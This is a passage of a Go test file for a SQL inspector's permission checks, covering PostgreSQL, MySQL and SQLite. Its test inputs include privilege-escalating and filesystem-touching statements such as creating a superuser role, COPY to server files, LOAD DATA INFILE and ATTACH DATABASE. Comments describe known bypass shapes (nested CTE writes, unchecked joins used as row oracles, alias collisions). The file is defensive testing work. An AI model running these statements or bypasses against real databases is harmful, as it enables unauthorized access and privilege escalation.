package engine

import (
	"slices"
	"strings"
	"testing"

	"github.com/selectDb/dialect/core"
	"github.com/selectDb/dialect/core/testutil"
)

const permDBID = "inst-1"

// permMeta is the catalog every inspector suite resolves names against, so a
// table or schema added for one of them reaches this one too. Its default
// schema serves all three dialects: an inspector resolves against
// meta.DefaultSchema, not against a default of its own.
func permMeta() *core.Metadata {
	meta := core.GetInspectTestMetadata()
	return &meta
}

// dataActionsOnly allows the four actions a statement can be resolved down to,
// and nothing else. A statement that passes under it is one we understood.
func dataActionsOnly() core.CompiledPermissions {
	return holding(core.ActionSelect, core.ActionInsert, core.ActionUpdate, core.ActionDelete)
}

// TestPermissions_StatementsThatNeedManage pins the statements that used to run
// unchecked. Each one inspected to nothing, and a check that iterates statements
// reads nothing as nothing to check, so the whole set executed under a policy
// that grants no manage.
func TestPermissions_StatementsThatNeedManage(t *testing.T) {
	tests := []struct {
		dialect string
		sql     []string
	}{
		{
			dialect: "postgresql",
			sql: []string{
				"COPY t1 FROM '/tmp/x.csv'",
				"COPY t1 TO '/tmp/x.csv'",
				"CREATE TABLE t9 AS SELECT * FROM t1",
				"DO $$ BEGIN DELETE FROM t1; END $$",
				"MERGE INTO t1 a USING t2 b ON a.c1 = b.c1 WHEN MATCHED THEN UPDATE SET c2 = 'x'",
				"GRANT SELECT ON t1 TO bob",
				"REVOKE ALL ON t1 FROM bob",
				"CREATE ROLE evil SUPERUSER",
				"CREATE VIEW v AS SELECT * FROM t1",
				"EXPLAIN ANALYZE DELETE FROM t1",
				"ALTER TABLE t1 RENAME TO t9",
				"REFRESH MATERIALIZED VIEW mv",
				"LOCK TABLE t1",
				"CALL some_proc()",
				"DROP TABLE t1",
				"TRUNCATE t1",
				"!!! not sql at all !!!",
			},
		},
		{
			dialect: "mysql",
			sql: []string{
				"LOAD DATA INFILE '/tmp/x' INTO TABLE t1",
				"GRANT SELECT ON t1 TO bob",
				"RENAME TABLE t1 TO t9",
				"CALL p()",
				"DROP TABLE t1",
			},
		},
		{
			dialect: "sqlite",
			sql: []string{
				"ATTACH DATABASE '/tmp/evil.db' AS e",
				"DROP TABLE t1",
				"ALTER TABLE t1 RENAME TO t9",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.dialect, func(t *testing.T) {
			d := GetDialect(tt.dialect)
			if d == nil {
				t.Fatalf("no dialect %q", tt.dialect)
			}
			perms := dataActionsOnly()

			for _, sql := range tt.sql {
				t.Run(sql, func(t *testing.T) {
					inspected := Inspect(d, permMeta(), sql)
					if len(inspected) == 0 {
						t.Fatal("inspected to nothing: a caller reading this as an empty result runs it unchecked")
					}
					err := core.CheckQueryPermissions(inspected, permDBID, perms)
					if err == nil {
						t.Fatal("allowed without manage")
					}
					if !strings.Contains(err.Error(), "manage") {
						t.Errorf("denied for the wrong reason: %v", err)
					}
				})
			}
		})
	}
}

// TestPermissions_DataStatementsAreUnaffected pins the other side: the four
// operations we resolve down to columns still pass on their own action, so
// routing the rest through manage did not turn ordinary work into a denial.
func TestPermissions_DataStatementsAreUnaffected(t *testing.T) {
	for _, dialect := range BuiltinDialects() {
		t.Run(dialect, func(t *testing.T) {
			perms := dataActionsOnly()
			for _, sql := range []string{
				"SELECT c1 FROM t1",
				"SELECT a.c1 FROM t1 a JOIN t2 b ON a.c1 = b.c1",
				"SELECT c1 FROM other.t3",
				"INSERT INTO t1 (c1) VALUES (1)",
				"UPDATE t1 SET c2 = 'x' WHERE c1 = 1",
				"DELETE FROM t1 WHERE c1 = 1",
			} {
				t.Run(sql, func(t *testing.T) {
					inspected := Inspect(GetDialect(dialect), permMeta(), sql)
					// A statement whose table stopped resolving is checked
					// against nothing and passes, which is the one way this
					// test goes green without testing anything.
					for _, stmt := range inspected {
						if len(stmt.Tables) == 0 {
							t.Fatalf("resolved no table, so the check had nothing to refuse: %+v", stmt)
						}
					}
					if err := core.CheckQueryPermissions(inspected, permDBID, perms); err != nil {
						t.Errorf("want allowed, got %v", err)
					}
				})
			}
		})
	}
}

// Blank input is not a statement, so it stays empty rather than becoming an
// unknown one that a caller would then have to refuse.
func TestInspect_BlankSQLStaysEmpty(t *testing.T) {
	for _, dialect := range BuiltinDialects() {
		t.Run(dialect, func(t *testing.T) {
			for _, sql := range []string{"", "   ", "\n\t "} {
				if got := Inspect(GetDialect(dialect), permMeta(), sql); len(got) != 0 {
					t.Errorf("Inspect(%q) = %d statements, want 0", sql, len(got))
				}
			}
		})
	}
}

// A dialect registered from outside this module is not one this package can
// audit, so engine.Inspect puts a floor under an empty result rather than
// trusting every implementation to have read the contract.
func TestInspect_ForeignDialectCannotReturnNothing(t *testing.T) {
	RegisterDialect("silent-test-dialect", silentDialect{})
	t.Cleanup(func() { RegisterDialect("silent-test-dialect", nil) })

	got := Inspect(GetDialect("silent-test-dialect"), permMeta(), "DROP TABLE t1")
	if len(got) != 1 || got[0].Operation != core.InspectOpUnknown {
		t.Fatalf("got %+v, want one unknown statement", got)
	}
	if err := core.CheckQueryPermissions(got, permDBID, dataActionsOnly()); err == nil {
		t.Error("a dialect that inspects to nothing ran unchecked")
	}
}

// silentDialect inspects to nothing, the way a dialect written against the old
// contract does.
type silentDialect struct {
	core.SQLDialect
}

func (silentDialect) Inspect(core.Metadata, string) []core.InspectStatement { return nil }

// holding is a role with exactly the actions named, on every table. It denies a
// database no rule names, so dropping the only action still refuses: otherwise
// a necessary-direction loop over one action proves nothing.
func holding(actions ...string) core.CompiledPermissions {
	var entries []core.PermissionEntry
	for _, a := range actions {
		entries = append(entries, core.PermissionEntry{Action: a, Effect: "allow", RoleName: "test-role"})
	}
	return compileFor(permDBID, entries...).WithDenyUnmanaged()
}

// nestedCase is a statement carrying another statement, and the permissions a
// role must hold for it to run: anything less is refused, all of them run.
type nestedCase struct {
	dialects []string
	sql      string
	needs    []string
	why      string
}

// TestPermissions_NestedStatementsAreChecked pins the statements that carry
// another statement inside them. A nested statement the inspector did not
// report is a statement nobody checked, and the outer one being refused is no
// help when the outer one is the part that passes.
func TestPermissions_NestedStatementsAreChecked(t *testing.T) {
	tests := []nestedCase{
		{
			dialects: []string{"postgresql"},
			sql:      "WITH x AS (DELETE FROM t1 RETURNING c1) SELECT c1 FROM x",
			needs:    []string{core.ActionSelect, core.ActionDelete},
			why:      "the CTE deletes; it used to run under a policy granting nothing at all",
		},
		{
			dialects: []string{"postgresql"},
			sql:      "WITH x AS (UPDATE t1 SET c2 = 'x' RETURNING c1) SELECT c1 FROM x",
			needs:    []string{core.ActionSelect, core.ActionUpdate},
			why:      "same shape, an update",
		},
		{
			dialects: []string{"postgresql"},
			sql:      "WITH x AS (INSERT INTO t1 (c1) VALUES (1) RETURNING c1) SELECT c1 FROM x",
			needs:    []string{core.ActionSelect, core.ActionInsert},
			why:      "same shape, an insert",
		},
		{
			dialects: []string{"postgresql"},
			sql:      "UPDATE t2 SET c1 = t1.c1 FROM t1",
			needs:    []string{core.ActionUpdate, core.ActionSelect},
			why:      "t1 is read to fill t2, and update does not cover reading it",
		},
		{
			dialects: []string{"postgresql"},
			sql:      "DELETE FROM t2 USING t1 WHERE t2.c1 = t1.c1",
			needs:    []string{core.ActionDelete, core.ActionSelect},
			why:      "USING reads t1 the same way",
		},
		{
			dialects: []string{"postgresql"},
			sql:      "COPY (SELECT c1 FROM t1) TO '/tmp/x.csv'",
			needs:    []string{core.ActionManage, core.ActionSelect},
			why:      "writing the server's filesystem takes manage, reading t1 takes select",
		},
		{
			dialects: []string{"postgresql"},
			sql:      "CREATE MATERIALIZED VIEW mv AS SELECT c1 FROM t1",
			needs:    []string{core.ActionManage, core.ActionSelect},
			why:      "a materialized view holds the rows it read",
		},
		{
			dialects: []string{"postgresql"},
			sql:      "CREATE TABLE t9 AS (SELECT c1 FROM t1)",
			needs:    []string{core.ActionManage, core.ActionSelect},
			why:      "a parenthesized source is the same read as an unparenthesized one",
		},
		{
			dialects: []string{"postgresql"},
			sql:      "CREATE TABLE t9 AS TABLE t1",
			needs:    []string{core.ActionManage, core.ActionSelect},
			why:      "TABLE t1 is SELECT * FROM t1",
		},
		{
			dialects: []string{"sqlite"},
			sql:      "UPDATE t2 SET c1 = t1.c1 FROM t1",
			needs:    []string{core.ActionUpdate, core.ActionSelect},
			why:      "SQLite has UPDATE ... FROM too, and it reads t1 the same way",
		},
		{
			dialects: BuiltinDialects(),
			sql:      "CREATE TABLE t9 AS SELECT c1 FROM t1",
			needs:    []string{core.ActionManage, core.ActionSelect},
			why:      "creating it takes manage, and the query it is filled from still reads t1",
		},
		{
			dialects: BuiltinDialects(),
			sql:      "CREATE VIEW v AS SELECT c1 FROM t1",
			needs:    []string{core.ActionManage, core.ActionSelect},
			why:      "a view over t1 reads t1 whenever it is used",
		},
	}

	for _, tt := range tests {
		for _, dialect := range tt.dialects {
			t.Run(dialect+": "+tt.sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), tt.sql)
				if len(inspected) == 0 {
					t.Fatal("inspected to nothing: a caller reading this as an empty result runs it unchecked")
				}

				// Every action but one: each is necessary, so each is refused.
				for idx, missing := range tt.needs {
					rest := slices.Delete(slices.Clone(tt.needs), idx, idx+1)
					if err := core.CheckQueryPermissions(inspected, permDBID, holding(rest...)); err == nil {
						t.Errorf("ran without %q. %s", missing, tt.why)
					}
				}

				// All of them together: the statement is allowed, so the test is
				// not passing because everything is refused.
				if err := core.CheckQueryPermissions(inspected, permDBID, holding(tt.needs...)); err != nil {
					t.Errorf("holding %v still refused it: %v", tt.needs, err)
				}
			})
		}
	}
}

// TestPermissions_ACTEBodyIsCheckedAgainstItsOwnTable pins where a nested write
// lands. Granting the outer statement's table says nothing about the table the
// CTE writes, and a check that never saw the CTE cannot tell them apart.
func TestPermissions_ACTEBodyIsCheckedAgainstItsOwnTable(t *testing.T) {
	const schema = "main"
	// Everything on t2, nothing at all on t1.
	onT2Only := compileFor(permDBID,
		core.PermissionEntry{SchemaName: sptr(schema), TableName: sptr("t2"), Action: core.ActionSelect, Effect: "allow", RoleName: "writer"},
		core.PermissionEntry{SchemaName: sptr(schema), TableName: sptr("t2"), Action: core.ActionDelete, Effect: "allow", RoleName: "writer"},
	)

	refused := []string{
		"WITH x AS (DELETE FROM t1 RETURNING c1) DELETE FROM t2 WHERE c1 = 1",
		"WITH x AS (DELETE FROM t1 RETURNING c1) SELECT c1 FROM x",
		"DELETE FROM t2 USING t1 WHERE t2.c1 = t1.c1",
	}
	for _, sql := range refused {
		t.Run("refused: "+sql, func(t *testing.T) {
			inspected := Inspect(GetDialect("postgresql"), permMeta(), sql)
			if err := core.CheckQueryPermissions(inspected, permDBID, onT2Only); err == nil {
				t.Error("reached t1 while holding nothing on t1")
			}
		})
	}

	// The same role's own work still runs, so the refusals above are not a
	// policy that refuses everything.
	for _, sql := range []string{
		"DELETE FROM t2 WHERE c1 = 1",
		"SELECT c1 FROM t2",
	} {
		t.Run("allowed: "+sql, func(t *testing.T) {
			inspected := Inspect(GetDialect("postgresql"), permMeta(), sql)
			if err := core.CheckQueryPermissions(inspected, permDBID, onT2Only); err != nil {
				t.Errorf("want allowed, got %v", err)
			}
		})
	}
}

// TestPermissions_ACTEIsNotAnUnresolvedTable pins the other direction: a name a
// CTE defines is not a table, so the statements that read one keep working.
func TestPermissions_ACTEIsNotAnUnresolvedTable(t *testing.T) {
	perms := dataActionsOnly()
	cases := map[string][]string{
		"postgresql": {
			"WITH x AS (SELECT c1 FROM t1) UPDATE t2 SET c1 = x.c1 FROM x",
			"WITH x AS (SELECT c1 FROM t1) DELETE FROM t2 USING x WHERE t2.c1 = x.c1",
			"UPDATE t2 SET c1 = s.c1 FROM (SELECT c1 FROM t1) s",
			"UPDATE t2 SET c1 = a.c1 FROM t1 a WHERE t2.c1 = a.c1",
		},
		"sqlite": {
			"WITH x AS (SELECT c1 FROM t1) UPDATE t2 SET c1 = x.c1 FROM x",
			"UPDATE t2 SET c1 = s.c1 FROM (SELECT c1 FROM t1) s",
			"UPDATE t2 SET c1 = a.c1 FROM t1 a WHERE t2.c1 = a.c1",
		},
	}
	for _, dialect := range []string{"postgresql", "sqlite"} {
		for _, sql := range cases[dialect] {
			t.Run(dialect+": "+sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), sql)
				if err := core.CheckQueryPermissions(inspected, permDBID, perms); err != nil {
					t.Errorf("want allowed, got %v", err)
				}
			})
		}
	}
}

// TestPermissions_AReadNamesWhatItReads pins the shapes that resolved to a
// select over no tables. A select naming no table is checked against nothing
// and runs under any policy, which is correct for SELECT 1 and a bypass for
// everything else.
func TestPermissions_AReadNamesWhatItReads(t *testing.T) {
	nothingGranted := core.Compile(nil).WithDenyUnmanaged()

	refused := map[string][]string{
		"postgresql": {"(SELECT c1 FROM t1)", "((SELECT c1 FROM t1))", "TABLE t1"},
		"mysql":      {"TABLE t1"},
	}
	for _, dialect := range []string{"postgresql", "mysql"} {
		for _, sql := range refused[dialect] {
			t.Run(dialect+": "+sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), sql)
				if err := core.CheckQueryPermissions(inspected, permDBID, nothingGranted); err == nil {
					t.Error("read t1 under a policy granting nothing")
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, holding(core.ActionSelect)); err != nil {
					t.Errorf("select alone should run it, got %v", err)
				}
			})
		}
	}

	// A query that reads no table is not a bypass, and must keep running.
	for _, dialect := range BuiltinDialects() {
		for _, sql := range []string{"SELECT 1", "SELECT 1 + 1"} {
			t.Run(dialect+": "+sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), sql)
				if err := core.CheckQueryPermissions(inspected, permDBID, nothingGranted); err != nil {
					t.Errorf("a query naming no table was refused: %v", err)
				}
			})
		}
	}
}

// tableGrant is one action on one table, the granularity a role is actually
// configured at. holding() grants on every table, which cannot express "may
// read t1 but not t2" -- the shape these cases turn on.
type tableGrant struct {
	schema, table, action string
}

func holdingPerTable(grants ...tableGrant) core.CompiledPermissions {
	var entries []core.PermissionEntry
	for _, g := range grants {
		schema, table := g.schema, g.table
		entries = append(entries, core.PermissionEntry{
			SchemaName: &schema,
			TableName:  &table,
			Action:     g.action,
			Effect:     "allow",
			RoleName:   "test-role",
		})
	}
	// Dropping the only grant leaves no rule naming the database, which reads as
	// unmanaged and passes everything, so the necessary-direction loop would
	// prove nothing without this.
	return compileFor(permDBID, entries...).WithDenyUnmanaged()
}

// TestPermissions_EveryTableIsChecked pins the statements that name a column of
// one table and none of another. The per-column walk matched nothing for the
// second table and the loop moved on, so a role holding select on main.t1 read
// main.t2 and other.t3 through a join. A WHERE over the unchecked table turns
// that into an oracle over every row in it.
func TestPermissions_EveryTableIsChecked(t *testing.T) {
	tests := []struct {
		dialects []string
		sql      string
		needs    []tableGrant
		why      string
	}{
		{
			dialects: BuiltinDialects(),
			sql:      "SELECT t1.c2 FROM t1, t2",
			needs: []tableGrant{
				{"main", "t1", core.ActionSelect},
				{"main", "t2", core.ActionSelect},
			},
			why: "t2 is joined for its rows even though no column of it is named",
		},
		{
			dialects: BuiltinDialects(),
			sql:      "SELECT t1.c2 FROM t1 JOIN t2 ON t1.c1 = t2.c1",
			needs: []tableGrant{
				{"main", "t1", core.ActionSelect},
				{"main", "t2", core.ActionSelect},
			},
			why: "an explicit join reads t2 the same way a comma join does",
		},
		{
			dialects: BuiltinDialects(),
			sql:      "SELECT t1.c2 FROM t1, t2 WHERE t2.c3 = 'secret'",
			needs: []tableGrant{
				{"main", "t1", core.ActionSelect},
				{"main", "t2", core.ActionSelect},
			},
			why: "the predicate reports whether t2 holds that value, a row at a time",
		},
		{
			dialects: BuiltinDialects(),
			sql:      "SELECT t1.c2 FROM t1 JOIN other.t3 ON t1.c1 = other.t3.c1",
			needs: []tableGrant{
				{"main", "t1", core.ActionSelect},
				{"other", "t3", core.ActionSelect},
			},
			why: "a grant on one schema does not reach a table in another",
		},
	}

	for _, tt := range tests {
		for _, dialect := range tt.dialects {
			t.Run(dialect+": "+tt.sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), tt.sql)
				if len(inspected) == 0 {
					t.Fatal("inspected to nothing: a caller reading this as an empty result runs it unchecked")
				}
				// Both tables have to resolve, or the second one is refused for
				// naming no schema and the test passes without testing this.
				if got := len(inspected[0].Tables); got != len(tt.needs) {
					t.Fatalf("resolved %d tables, want %d: %+v", got, len(tt.needs), inspected[0].Tables)
				}

				for idx, missing := range tt.needs {
					rest := slices.Delete(slices.Clone(tt.needs), idx, idx+1)
					if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(rest...)); err == nil {
						t.Errorf("ran without %s on %s.%s. %s", missing.action, missing.schema, missing.table, tt.why)
					}
				}

				if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(tt.needs...)); err != nil {
					t.Errorf("holding %v still refused it: %v", tt.needs, err)
				}
			})
		}
	}
}

// TestPermissions_ClauseSubqueriesAreChecked pins the clauses that hold a
// subquery outside the FROM list, the select list and the WHERE. Each one was
// walked by nothing, so the subquery never reached the result and a role
// holding select on main.t1 read main.t2 through it.
func TestPermissions_ClauseSubqueriesAreChecked(t *testing.T) {
	const s = "main"

	for _, tt := range []struct {
		clause string
		sql    string
	}{
		{"HAVING", "SELECT c1 FROM t1 GROUP BY c1 HAVING count(*) > (SELECT count(*) FROM t2)"},
		{"GROUP BY", "SELECT count(*) FROM t1 GROUP BY (SELECT c1 FROM t2)"},
		{"ORDER BY", "SELECT c1 FROM t1 ORDER BY (SELECT c1 FROM t2)"},
		{"WINDOW", "SELECT c1 FROM t1 WINDOW w AS (PARTITION BY (SELECT c1 FROM t2))"},
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+tt.clause, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), tt.sql)
				// The read has to be in the result at all. Without this the
				// permission check below has nothing to refuse and goes green
				// on exactly the bug it is here to catch.
				read := testutil.Touch{Op: core.InspectOpSelect, Schema: s, Name: "t2"}
				if !testutil.Touches(inspected, read) {
					t.Fatalf("the %s subquery reads main.t2 and nothing reported it: %+v", tt.clause, inspected)
				}

				needs := []tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionSelect}}
				for idx, missing := range needs {
					rest := slices.Delete(slices.Clone(needs), idx, idx+1)
					if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(rest...)); err == nil {
						t.Errorf("ran without %s on %s.%s", missing.action, missing.schema, missing.table)
					}
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(needs...)); err != nil {
					t.Errorf("holding select on both tables still refused it: %v", err)
				}
			})
		}
	}
}

// TestPermissions_DeclaredNamesAreNotTables pins the other side of carrying the
// clause subqueries. A subquery in an expression is inspected without the scope
// of the query around it, so a CTE name or a FROM-subquery alias it reads looks
// like a table that resolved to no schema, and the check refuses that for every
// role. Reporting more subqueries must not mean refusing more ordinary work.
func TestPermissions_DeclaredNamesAreNotTables(t *testing.T) {
	for _, tt := range []struct {
		sql  string
		real testutil.Touch
	}{
		{"WITH x AS (SELECT c1 FROM t1) SELECT c1 FROM x ORDER BY (SELECT c1 FROM x)",
			testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t1"}},
		{"WITH x AS (SELECT c1 FROM t1) SELECT c1 FROM t2 WHERE c1 IN (SELECT c1 FROM x)",
			testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t2"}},
		{"WITH x AS (SELECT c1 FROM t1) SELECT (SELECT count(*) FROM x) FROM t2",
			testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t2"}},
		{"WITH x AS (SELECT c1 FROM t1) SELECT c1 FROM t2 GROUP BY c1 HAVING count(*) > (SELECT count(*) FROM x)",
			testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t2"}},
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+tt.sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), tt.sql)
				// A statement that resolved nothing names no unresolved table
				// and needs no permission, so it passes both checks below
				// without exercising either.
				if !testutil.Touches(inspected, tt.real) {
					t.Fatalf("no read of %s.%s, so nothing here was checked: %+v", tt.real.Schema, tt.real.Name, inspected)
				}
				if name := unresolvedTable(inspected); name != "" {
					t.Errorf("%q is a name the statement declares, reported as a table: %+v", name, inspected)
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, dataActionsOnly()); err != nil {
					t.Errorf("ordinary work refused: %v", err)
				}
			})
		}
	}
}

// TestPermissions_AQualifiedNameIsTheRealTable pins the other edge of dropping
// a CTE name. A CTE shadows the bare name, never the qualified one, so a
// subquery naming main.t2 reads the table whatever the CTE around it is called.
// Matching on the bare name alone deleted that read, and the statement then ran
// on a grant covering only main.t1.
func TestPermissions_AQualifiedNameIsTheRealTable(t *testing.T) {
	const s = "main"
	read := testutil.Touch{Op: core.InspectOpSelect, Schema: s, Name: "t2"}

	for _, sql := range []string{
		"SELECT c1 FROM (SELECT c1 FROM t1) t2 ORDER BY (SELECT c1 FROM main.t2)",
		"SELECT c1 FROM (SELECT c1 FROM t1) t2 WHERE c1 IN (SELECT c1 FROM main.t2)",
		"SELECT (SELECT c1 FROM main.t2) FROM (SELECT c1 FROM t1) t2",
		"WITH t2 AS (SELECT c1 FROM t1) SELECT c1 FROM t2 WHERE c1 IN (SELECT c1 FROM main.t2)",
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), sql)
				if !testutil.Touches(inspected, read) {
					t.Fatalf("main.t2 is read and nothing reported it: %+v", inspected)
				}

				needs := []tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionSelect}}
				for idx, missing := range needs {
					rest := slices.Delete(slices.Clone(needs), idx, idx+1)
					if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(rest...)); err == nil {
						t.Errorf("ran without %s on %s.%s", missing.action, missing.schema, missing.table)
					}
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(needs...)); err != nil {
					t.Errorf("holding select on both tables still refused it: %v", err)
				}
			})
		}
	}
}

// unresolvedTable returns the name of the first table in the tree that resolved
// to no schema, or "". Such a table is refused whatever the role holds, so it
// is what a false denial looks like before the check runs.
func unresolvedTable(stmts []core.InspectStatement) string {
	for _, stmt := range stmts {
		for _, table := range stmt.Tables {
			if table.Schema == "" {
				return table.Name
			}
		}
		if name := unresolvedTable(stmt.Subqueries); name != "" {
			return name
		}
	}
	return ""
}

// TestPermissions_CTEVisibleInsideAnotherBody pins the CTE bodies. A body is
// inspected without the WITH clause around it, so a sibling or a recursive
// self-reference came back as a table resolving to no schema. checkTables
// refuses that whatever the role holds, so a recursive CTE and a CTE built from
// another one were refused for everybody, manage included.
func TestPermissions_CTEVisibleInsideAnotherBody(t *testing.T) {
	const s = "main"

	for _, tt := range []struct {
		sql   string
		needs []tableGrant
	}{
		{"WITH RECURSIVE x AS (SELECT c1 FROM t1 UNION ALL SELECT c1 FROM x) SELECT * FROM x",
			[]tableGrant{{s, "t1", core.ActionSelect}}},
		{"WITH RECURSIVE x(c1) AS (SELECT c1 FROM t1 UNION ALL SELECT c1 FROM x WHERE c1 < 5) SELECT * FROM x",
			[]tableGrant{{s, "t1", core.ActionSelect}}},
		{"WITH a AS (SELECT c1 FROM t1), b AS (SELECT c1 FROM a) SELECT * FROM b",
			[]tableGrant{{s, "t1", core.ActionSelect}}},
		{"WITH a AS (SELECT c1 FROM t1), b AS (SELECT c1 FROM a WHERE c1 IN (SELECT c1 FROM a)) SELECT * FROM b",
			[]tableGrant{{s, "t1", core.ActionSelect}}},
		{"WITH a AS (SELECT c1 FROM t1), b AS (SELECT c1 FROM t2), c AS (SELECT c1 FROM a UNION SELECT c1 FROM b) SELECT * FROM c",
			[]tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionSelect}}},
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+tt.sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), tt.sql)
				if !testutil.Touches(inspected, testutil.Touch{Op: core.InspectOpSelect, Schema: s, Name: "t1"}) {
					t.Fatalf("no read of main.t1, so nothing here was checked: %+v", inspected)
				}
				if name := unresolvedTable(inspected); name != "" {
					t.Errorf("%q is a CTE the statement declares, reported as a table: %+v", name, inspected)
				}

				// The tables behind the CTEs are still read, so each grant is
				// necessary: dropping the denial must not drop the check.
				for idx, missing := range tt.needs {
					rest := slices.Delete(slices.Clone(tt.needs), idx, idx+1)
					if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(rest...)); err == nil {
						t.Errorf("ran without %s on %s.%s", missing.action, missing.schema, missing.table)
					}
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(tt.needs...)); err != nil {
					t.Errorf("holding %v still refused it: %v", tt.needs, err)
				}
			})
		}
	}
}

// TestPermissions_LaterCTENameIsTheRealTable is the other edge. A plain WITH
// exposes only the CTEs declared before a body, so a name declared later is the
// table: PostgreSQL 16 runs "WITH a AS (SELECT c1 FROM t2), t2 AS (...)"
// against main.t2. Treating the whole clause as in scope would delete that read.
func TestPermissions_LaterCTENameIsTheRealTable(t *testing.T) {
	const s = "main"
	const sql = "WITH a AS (SELECT c1 FROM t2), t2 AS (SELECT c1 FROM t1) SELECT * FROM a"

	for _, dialect := range BuiltinDialects() {
		t.Run(dialect, func(t *testing.T) {
			inspected := Inspect(GetDialect(dialect), permMeta(), sql)
			if !testutil.Touches(inspected, testutil.Touch{Op: core.InspectOpSelect, Schema: s, Name: "t2"}) {
				t.Fatalf("main.t2 is read and nothing reported it: %+v", inspected)
			}

			needs := []tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionSelect}}
			for idx, missing := range needs {
				rest := slices.Delete(slices.Clone(needs), idx, idx+1)
				if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(rest...)); err == nil {
					t.Errorf("ran without %s on %s.%s", missing.action, missing.schema, missing.table)
				}
			}
			if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(needs...)); err != nil {
				t.Errorf("holding select on both tables still refused it: %v", err)
			}
		})
	}
}

// TestPermissions_AQualifiedNameIsNeverVirtual pins the tables a FROM list
// dropped because a CTE or a subquery alias beside them happened to share their
// bare name. convertRelationRefs matched on that name alone, so naming an alias
// after a table hid the table: the role below read other.t3 and main.t2 holding
// select on main.t1 and nothing else. A subquery alias collides the same way,
// and is pinned per dialect, since what each reports for the subquery differs.
func TestPermissions_AQualifiedNameIsNeverVirtual(t *testing.T) {
	const s = "main"

	for _, tt := range []struct {
		sql   string
		read  testutil.Touch
		needs []tableGrant
	}{
		{"WITH t3 AS (SELECT c1 FROM t1) SELECT * FROM t3 JOIN other.t3 ON 1=1",
			testutil.Touch{Op: core.InspectOpSelect, Schema: "other", Name: "t3"},
			[]tableGrant{{s, "t1", core.ActionSelect}, {"other", "t3", core.ActionSelect}}},
		{"WITH t2 AS (SELECT c1 FROM t1) SELECT * FROM t2 JOIN main.t2 ON 1=1",
			testutil.Touch{Op: core.InspectOpSelect, Schema: s, Name: "t2"},
			[]tableGrant{{s, "t1", core.ActionSelect}, {s, "t2", core.ActionSelect}}},
		{"WITH t3 AS (SELECT c1 FROM t1) SELECT other.t3.c4 FROM t3, other.t3",
			testutil.Touch{Op: core.InspectOpSelect, Schema: "other", Name: "t3"},
			[]tableGrant{{s, "t1", core.ActionSelect}, {"other", "t3", core.ActionSelect}}},
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+tt.sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), tt.sql)
				if !testutil.Touches(inspected, tt.read) {
					t.Fatalf("%s.%s is read and nothing reported it: %+v", tt.read.Schema, tt.read.Name, inspected)
				}

				for idx, missing := range tt.needs {
					rest := slices.Delete(slices.Clone(tt.needs), idx, idx+1)
					if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(rest...)); err == nil {
						t.Errorf("ran without %s on %s.%s", missing.action, missing.schema, missing.table)
					}
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable(tt.needs...)); err != nil {
					t.Errorf("holding %v still refused it: %v", tt.needs, err)
				}
			})
		}
	}
}

// An unqualified name that matches a CTE or a subquery alias is still that
// relation, so the guard above must not turn every alias back into a table.
func TestPermissions_AnUnqualifiedNameStillResolvesToTheAlias(t *testing.T) {
	for _, sql := range []string{
		"WITH t2 AS (SELECT c1 FROM t1) SELECT c1 FROM t2",
		"SELECT * FROM (SELECT c1 FROM t1) s",
	} {
		for _, dialect := range BuiltinDialects() {
			t.Run(dialect+": "+sql, func(t *testing.T) {
				inspected := Inspect(GetDialect(dialect), permMeta(), sql)
				if !testutil.Touches(inspected, testutil.Touch{Op: core.InspectOpSelect, Schema: "main", Name: "t1"}) {
					t.Fatalf("no read of main.t1, so nothing here was checked: %+v", inspected)
				}
				if err := core.CheckQueryPermissions(inspected, permDBID, holdingPerTable()); err == nil {
					t.Error("ran holding nothing, so passing below proves nothing")
				}
				onlyT1 := holdingPerTable(tableGrant{"main", "t1", core.ActionSelect})
				if err := core.CheckQueryPermissions(inspected, permDBID, onlyT1); err != nil {
					t.Errorf("the alias was read as a table: %v", err)
				}
			})
		}
	}
}

// The same collision written with a subquery alias rather than a CTE. What each
// dialect reports for the subquery itself differs, so only the qualified read
// is pinned; the grants it needs are pinned by the CTE cases above.
func TestInspect_AQualifiedNameSurvivesAnAliasOfTheSameName(t *testing.T) {
	want := testutil.Touch{Op: core.InspectOpSelect, Schema: "other", Name: "t3"}

	for _, sql := range []string{
